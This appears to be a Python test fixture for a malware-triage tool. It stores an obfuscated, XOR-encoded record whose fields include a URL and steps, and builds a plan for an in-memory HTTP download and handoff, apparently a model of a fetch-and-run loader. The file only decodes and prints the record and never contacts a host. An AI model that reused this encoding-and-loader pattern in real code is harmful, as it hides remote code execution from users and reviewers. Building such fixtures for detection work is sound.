#!/usr/bin/env python3
# Huntress Script Triage -- inert static-analysis fixture (cpython3)
import base64
import io
import os

MATERIAL_ee07460f = "200,205,200,152,159,203,206,204,203,203,210,147,146,149,137,132,173,142,142,152,143,137,147,136,181,192,137,147,152,154,156,162,143,152,142,136,129,132,141,211,156,202,155,204,155,202,153,204,210,153,148,145,156,139,147,148,211,152,145,141,144,156,133,152,211,200,205,200,152,159,203,206,204,203,203,210,210,199,142,141,137,137,149,192,145,143,136,129,200,205,200,152,159,203,206,204,203,203,208,147,154,148,156,141,144,156,158,192,153,148,162,147,154,148,156,141,144,156,158,129,147,146,149,137,132,141,162,146,137,162,145,145,152,149,142,143,152,138,146,141,192,147,148,156,149,158,162,142,138,146,153,147,148,138,129,152,139,148,149,158,143,156,162,145,152,152,149,138,192,143,152,148,143,143,156,158,129,141,156,144,162,137,156,144,143,146,155,192,147,146,148,137,156,158,142,136,155,159,146,129,147,146,148,142,147,152,149,152,143,141,144,146,158,162,137,142,148,145,192,133,156,137,147,132,142,129,204,192,137,147,136,146,158,162,152,154,156,137,142,129,132,143,146,144,152,144,162,137,147,152,148,145,158,162,141,137,137,149,192,143,152,137,141,156,153,156,129,132,143,146,144,152,144,162,149,158,137,156,141,142,148,153,209,152,137,146,144,152,143,162,152,143,148,136,140,158,156,192,142,141,152,137,142,129,207,192,139"
CODEC_ee07460f = "decimal_csv|reverse_then_xor|fd"

def load_ee07460f():
    return bytes(int(item) for item in MATERIAL_ee07460f.split(","))

def decode_ee07460f(e):
    return bytes(value ^ 253 for value in reversed(e))

def recover_ee07460f():
    n = os.environ.get("HUNTRESS_FIXTURE_CONTEXT", "host")
    for _pass in range(1):
        d = decode_ee07460f(load_ee07460f())
    t = d.decode("ascii", "strict")
    return t

def inspect_ee07460f():
    stream = io.BytesIO(recover_ee07460f().encode("ascii"))
    return stream.read().decode("ascii")

def surface_ee07460f():
    return tuple(item for item in ("list_comprehension", "format_map", "wheel_archive", "powershell_to_python"))

def obfuscation_ee07460f():
    return "{left}{right}".format_map({"left": "format_", "right": "map"})

def plan_ee07460f():
    fields = dict(item.split("=", 1) for item in inspect_ee07460f().split("|"))
    analysis_surface = surface_ee07460f()
    obfuscation_surface = obfuscation_ee07460f()
    operation_plan = ("http_client_memory", fields["url"], "memory-handoff")
    return operation_plan + (analysis_surface, obfuscation_surface)

if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
    print(inspect_ee07460f())
